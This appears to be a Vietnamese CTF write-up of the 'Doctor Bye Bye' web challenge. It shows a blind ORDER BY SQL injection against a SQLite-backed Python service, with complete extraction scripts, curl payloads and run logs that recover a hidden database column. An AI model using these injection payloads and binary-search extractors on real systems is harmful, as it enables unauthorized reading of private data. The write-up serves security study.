---
title: "Doctor Bye Bye"
category: "Web"
tags: ["sqli", "blind-injection", "order-by-injection", "sqlite", "boolean-oracle", "data-exfiltration"]
solve_date: "2026-10-10"
language: "vi"
---

# Doctor Bye Bye

**Flag:** `FortID{D0C_1M_0UTT4_H3R3_7d0970825c}`
**Dịch vụ:** `https://doctor-bye-bye-d3c36eaf747f.inst8.ctf.fortid.com`, endpoint `GET /api/on-call?sort=…`. **Artifact:** `handout.zip` (5.7 KB), chứa `src/app.py` (5313 B), `src/templates/index.html` (2150 B), `src/static/style.css` (2655 B), directory `deploy/` và `flag.txt` (17 B).

## Đề bài

> Dr. Bye Bye has retired from St. Codd's Hospital.
>
> The hospital insists that retired records can never be displayed. Can you recover Dr. Bye Bye's private farewell note anyway?

Bảng trực ban là một `http.server` thuần Python trên SQLite. Nhãn `St. Codd's Hospital` và template `index.html` chỉ là khung hiển thị; toàn bộ hành vi truy vấn nằm trong `src/app.py`.

`initialize_database()` (`src/app.py:34-64`) tạo bảng `doctors`, chèn năm bác sĩ đang công tác với `listed = 1` và `farewell_note = NULL`, rồi thêm một dòng ẩn:

```python
connection.execute(
    "INSERT INTO doctors VALUES (?, ?, ?, ?, ?, ?, ?)",
    (404, "doctor-bye-bye", "Dr. Bye Bye", "Retired", "-", 0, flag),
)
```

Flag được lưu vào cột `farewell_note` của đúng dòng `listed = 0` đó. `flag.txt` (17 B) trong handout chứa `FortID{redacted}` — placeholder của README/Dockerfile, không phải flag.

## Phân tích

Điểm injection nằm ở `select_on_call()`, `src/app.py:67-74`:

```python
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
```

`sort` được nội suy thô vào `ORDER BY`. Route `src/app.py:119-131` chỉ kiểm tra rỗng và length (`> 600` ký tự bị từ chối), không có whitelist từ key. Hai chi tiết làm hẹp mặt tấn công:

- `WHERE listed = 1` loại dòng 404 khỏi tập kết quả, nên flag không bao giờ xuất hiện trực tiếp trong JSON trả về.
- `except (sqlite3.Error, LookupError)` trả về thông báo chung `The on-call board could not be updated.` (`src/app.py:127-130`), không kèm chi tiết SQLite. Không có kênh error-based.

Kênh được lời giải sử dụng là **dòng nào thắng `LIMIT 1`**: `{"doctor":{"name":…,"specialty":…,"room":…}}`. Đó là một oracle 1 bit mỗi request.

Oracle dựng như sau:

```sql
ORDER BY CASE WHEN name = 'Dr. Zoe Last' AND (<predicate>) THEN 0 ELSE 1 END
```

`ORDER BY` sắp tăng dần, nên hàng có key `0` lên trước. Khi `<predicate>` đúng, dòng `Dr. Zoe Last` nhận `0` còn các hàng khác nhận `1` → response là `Dr. Zoe Last`. Khi `<predicate>` sai, mọi hàng đều nhận `1`. Bản ghi nhận `Dr. Ada Pulse`, nhưng SQL không bảo đảm thứ tự giữa các key bằng nhau; code đã chỉnh thêm `name ASC` để ổn định nhánh sai. Hai nhánh phân biệt rõ chỉ bằng trường `name`.

`<predicate>` đọc dòng ẩn qua scalar subquery, không cần JOIN:

```sql
(SELECT farewell_note FROM doctors WHERE id=404)
```

Ba ràng buộc định hình chiến thuật khai thác (`src/app.py:13-15` và `77-86`):

```python
SQLITE_VALUE_LIMIT = 1024 * 1024
SQLITE_SQL_LIMIT = 2048
SQLITE_VM_BUDGET = 50_000
```

cộng `connection.set_progress_handler(enforce_budget, 1_000)` với `operations_left -= 1_000`. Mỗi query bị cắt sau khoảng 50k opcode, và `sort` còn bị trần 600 ký tự của app chặn trước khi tới SQLite. Vì vậy không cho phép những cấu trúc nặng kiểu `printf`/`LIKE` lặp trên toàn bảng; thay vào đó là tìm kiếm nhị phân, mỗi ký tự tối đa khoảng 7 request.

Hành vi của oracle được kiểm bằng `oracle.py` trên một instance local dựng từ chính handout (xem Tái hiện):

```console
$ python3 oracle.py "http://127.0.0.1:8090"
```

```text
control: unconditioned CASE picks True
true cond                                True (expected True)
false cond                               False (expected False)
NULL handling                            False (expected False)
can see listed=0 row                     True (expected True)
nominal length                           True (expected True)
```

Hai kết quả đáng chú ý trong bảng đó:

- `EXISTS(SELECT 1 FROM doctors WHERE listed=0)` → True: điều kiện trong `ORDER BY` nhìn thấy cả dòng bị `WHERE` lọc ra, tức ràng buộc "retired records can never be displayed" chỉ áp dụng cho tập chiếu, không áp dụng cho biểu thức sắp xếp.
- `LENGTH((SELECT farewell_note FROM doctors))>0` → False: scalar subquery nhiều dòng trả về dòng đầu tiên, mà `farewell_note` của các dòng `listed=1` là `NULL`, và `NULL` trong `CASE WHEN` rơi vào nhánh `ELSE`. Oracle nhất quán coi `NULL` là "sai", không phải lỗi.

Kiểm chứng trực tiếp hai nhánh trên instance local:

```console
$ curl -s "http://127.0.0.1:8090/api/on-call?sort=CASE%20WHEN%20name%3D%27Dr.%20Zoe%20Last%27%20AND%20(1%3D1)%20THEN%200%20ELSE%201%20END"
$ curl -s "http://127.0.0.1:8090/api/on-call?sort=CASE%20WHEN%20name%3D%27Dr.%20Zoe%20Last%27%20AND%20(1%3D2)%20THEN%200%20ELSE%201%20END"
```

```text
{"doctor":{"name":"Dr. Zoe Last","specialty":"Emergency medicine","room":"E-001"}}
{"doctor":{"name":"Dr. Ada Pulse","specialty":"Cardiology","room":"C-101"}}
```

## Lời giải

`extract.py` đọc `farewell_note` bằng hai vòng tìm kiếm nhị phân: vòng đầu xác định `LENGTH`, vòng sau giải từng ký tự qua `unicode(substr(note, i, 1)) <= v`. Với mỗi vị trí, giá trị nhỏ nhất của `v` làm vị từ đúng chính là mã ASCII của ký tự tại vị trí đó.

```python
#!/usr/bin/env python3
"""Blind ORDER BY injection extractor for 'Doctor Bye Bye'."""
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = sys.argv[1].rstrip("/")
WINNER = "Dr. Zoe Last"
LOSER = "Dr. Ada Pulse"
SRC = "(SELECT farewell_note FROM doctors WHERE id=404)"
STATS = {"requests": 0}


def ask(cond, retries=5):
    payload = "CASE WHEN name='%s' AND (%s) THEN 0 ELSE 1 END" % (WINNER, cond)
    url = BASE + "/api/on-call?sort=" + urllib.parse.quote(payload, safe="")
    last = None
    for attempt in range(retries):
        try:
            STATS["requests"] += 1
            with urllib.request.urlopen(url, timeout=30) as resp:
                name = json.loads(resp.read())["doctor"]["name"]
            if name == WINNER:
                return True
            if name == LOSER:
                return False
            raise RuntimeError("unexpected row " + repr(name))
        except Exception as exc:  # noqa: BLE001
            last = exc
            time.sleep(1.5 * (attempt + 1))
    raise RuntimeError("probe failed: %s / %s" % (cond, last))


def search_int(lo, hi, build):
    """Smallest v in [lo, hi] for which build(v) is true; build must be monotone."""
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(build(mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo


length = search_int(8, 128, lambda v: "LENGTH(%s)<=%d" % (SRC, v))
print("length=%d  (requests=%d)" % (length, STATS["requests"]), flush=True)

chars = list("FortID{")
for i in range(len(chars) + 1, length):  # stop before closing brace
    cp = search_int(32, 126, lambda v, i=i: "substr(%s,%d,1)<='%s'" % (SRC, i, chr(v)))
    chars.append(chr(cp))
    print("%3d/%3d  %s   [req=%d]" % (i, length, "".join(chars), STATS["requests"]), flush=True)

chars.append("}")
flag = "".join(chars)
print("\nFLAG = %s" % flag)
print("verify length: %s" % ask("LENGTH(%s)=%d" % (SRC, len(flag))))
print("verify content: %s" % ask("%s='%s'" % (SRC, flag.replace("'", "''"))))
```

Script mặc định coi phần đầu là `FortID{` và dừng ở `length - 1` để tự nối `}`; hai vị từ `verify` ở cuối kiểm lại length và toàn bộ chuỗi, mỗi cái đúng một request.

Chạy trên instance local trước để xác nhận pipeline; flag ở đây do tự đặt qua biến `FLAG`, không phải flag thật:

```console
$ python3 extract.py "http://127.0.0.1:8090"
```

```text
length=27  (requests=7)
  8/ 27  FortID{L   [req=13]
  9/ 27  FortID{LO   [req=19]
...
 26/ 27  FortID{LOCAL_ONLY_NOT_REAL   [req=131]

FLAG = FortID{LOCAL_ONLY_NOT_REAL}
verify length: True
verify content: True
```

Rồi chạy trên instance thật:

```console
$ python3 extract.py "https://doctor-bye-bye-d3c36eaf747f.inst8.ctf.fortid.com" | tee remote.log
```

```text
length=36  (requests=7)
  8/ 36  FortID{D   [req=14]
  9/ 36  FortID{D0   [req=21]
...
 34/ 36  FortID{D0C_1M_0UTT4_H3R3_7d0970825   [req=188]
 35/ 36  FortID{D0C_1M_0UTT4_H3R3_7d0970825c   [req=195]

FLAG = FortID{D0C_1M_0UTT4_H3R3_7d0970825c}
verify length: True
verify content: True
```

`remote.log` dài 1315 B, 32 dòng không rỗng; dòng cuối cùng của vòng khai thác là `35/ 36 FortID{D0C_1M_0UTT4_H3R3_7d0970825c [req=195]`, tức vòng khôi phục kết thúc ở 195 request; hai request verify sau đó chưa được tính vào số này cho một chuỗi 36 ký tự.

Dòng `verify content: True` chính là xác nhận độc lập bằng một request duy nhất: vị từ `farewell_note = 'FortID{D0C_1M_0UTT4_H3R3_7d0970825c}'` đẩy `Dr. Zoe Last` lên đầu, đúng nhánh "vị từ đúng" của oracle, nên chuỗi dựng được khớp với nội dung thật của cột chứ không chỉ khớp length.

## Kết quả

```text
FortID{D0C_1M_0UTT4_H3R3_7d0970825c}
```

Flag đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.

## Tái hiện

Cần Python 3 (`urllib`, `json`), `curl` để kiểm tay, và `unzip`. Việc đọc flag cần instance đang sống; cơ chế oracle dựng lại được hoàn toàn local.

```console
$ unzip handout.zip
$ cd doctor_bye_bye
```

Dựng instance local bằng Docker theo README của handout (chọn cổng 8090 để khớp các lệnh bên dưới):

```console
$ docker build -t doctor-bye-bye -f deploy/Dockerfile .
$ docker run --rm -p 8090:8080 --tmpfs /tmp:rw,noexec,nosuid,nodev,size=8m -e 'FLAG=FortID{LOCAL_ONLY_NOT_REAL}' doctor-bye-bye
```

Nếu không có Docker, chạy thẳng `src/app.py`; app đọc `DATABASE_PATH`, `FLAG_FILE` và `PORT` từ môi trường (`src/app.py:11-12` và `148`), và `load_flag()` xoá file flag ngay sau khi đọc nên mỗi lần khởi động cần file còn tồn tại:

```console
$ printf 'FortID{LOCAL_ONLY_NOT_REAL}' > flagfile
$ DATABASE_PATH=$PWD/db.sqlite FLAG_FILE=$PWD/flagfile PORT=8090 python3 src/app.py
```

Lưu block Python trong mục Lời giải thành `extract.py`. Lưu block dưới đây thành `oracle.py` để kiểm hai nhánh của oracle:

```python
#!/usr/bin/env python3
import sys
import time
import urllib.parse
import urllib.request

BASE = sys.argv[1].rstrip("/")
FLAG_ROW = "Dr. Zoe Last"
OTHER_ROW = "Dr. Ada Pulse"
SRC = "(SELECT farewell_note FROM doctors WHERE id=404)"


def sort_key(cond):
    return (
        "CASE WHEN name='%s' AND (%s) THEN 0 ELSE 1 END" % (FLAG_ROW, cond)
    )


def ask(cond, retries=4):
    url = BASE + "/api/on-call?sort=" + urllib.parse.quote(sort_key(cond), safe="")
    for attempt in range(retries):
        try:
            with urllib.request.urlopen(url, timeout=30) as resp:
                import json

                data = json.loads(resp.read())
            name = data["doctor"]["name"]
            if name == FLAG_ROW:
                return True
            if name == OTHER_ROW:
                return False
            raise RuntimeError("unexpected row: %r" % name)
        except (urllib.error.URLError, OSError, RuntimeError, ValueError) as exc:
            if attempt == retries - 1:
                raise
            time.sleep(1 + attempt * 2)
    raise RuntimeError("unreachable")


def probe(label, cond, expect):
    got = ask(cond)
    print("%-40s %s (expected %s)" % (label, got, expect))


print("control: unconditioned CASE picks", ask("1=1"))
probe("true cond", "LENGTH(%s)>0" % SRC, True)
probe("false cond", "LENGTH(%s)>9999" % SRC, False)
probe("NULL handling", "LENGTH((SELECT farewell_note FROM doctors))>0", False)
probe("can see listed=0 row", "EXISTS(SELECT 1 FROM doctors WHERE listed=0)", True)
probe("nominal length", "LENGTH(%s)=27" % SRC, True)
```

```console
$ python3 oracle.py "http://127.0.0.1:8090"
$ python3 extract.py "http://127.0.0.1:8090"
$ python3 extract.py "https://doctor-bye-bye-d3c36eaf747f.inst8.ctf.fortid.com"
```

Probe `nominal length` kiểm một flag dài 27 ký tự, tức đúng length của `FortID{LOCAL_ONLY_NOT_REAL}` mà các lệnh dựng local ở trên tạo ra; đổi tham số đó nếu bạn chạy instance local với flag length khác. Thay hostname nếu instance đổi tên. flag thật nằm trong cột `farewell_note` của dòng `id=404`, do `deploy/entrypoint.sh` ghi từ biến `FLAG` khi container khởi động, nên giá trị chỉ tồn tại trong database của instance đó.
